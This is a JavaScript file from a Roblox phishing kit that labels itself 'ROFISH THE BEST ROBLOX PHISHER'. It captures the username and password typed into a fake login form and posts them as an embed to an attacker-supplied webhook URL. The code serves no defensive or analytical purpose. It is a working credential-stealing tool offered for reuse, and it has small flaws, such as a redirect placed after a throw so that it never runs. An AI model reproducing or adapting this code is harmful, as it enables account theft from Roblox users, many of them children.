function sendmessage() {
  const username = document.getElementById("login-username").value;
  const password = document.getElementById("login-password").value;
  
  const webhookURL = 'REPLACE THIS WITH YOUR WEBHOOK URL!';

  const embed = {
      embeds: [{
          title: "Type: ROBLOX LOGIN",
          description: "**USERNAME/EMAIL/PHONE NUMER:** " + username + "\n" + "**PASSWORD:** " + password,
          color: 16711680, // You can specify a color using decimal format (e.g., red is 16711680)
          author: {
              name: "ROFISH THE BEST ROBLOX PHISHER BETA666",
              icon_url: "https://preview.redd.it/i-see-this-in-the-phonk-community-quite-often-what-is-this-v0-3igcklfws38c1.jpg?width=750&format=pjpg&auto=webp&s=d24b37b3d48887768ae431b93f9e275f1185324c"
          },
          timestamp: new Date().toISOString()
      }]
  };

  fetch(webhookURL, {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json'
      },
      body: JSON.stringify(embed)
  })
  .then(response => {
      if (!response.ok) {
          throw new Error('Network response was not ok');
          window.location.href = "https://www.roblox.com/";
      }
      return response.json();
  })
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
};

document.addEventListener("DOMContentLoaded", function() {
  const lbutton = document.getElementById("login-button");
  lbutton.addEventListener("click", (event) => {
      event.preventDefault(); // Prevent default form submission behavior
      sendmessage();
  });
});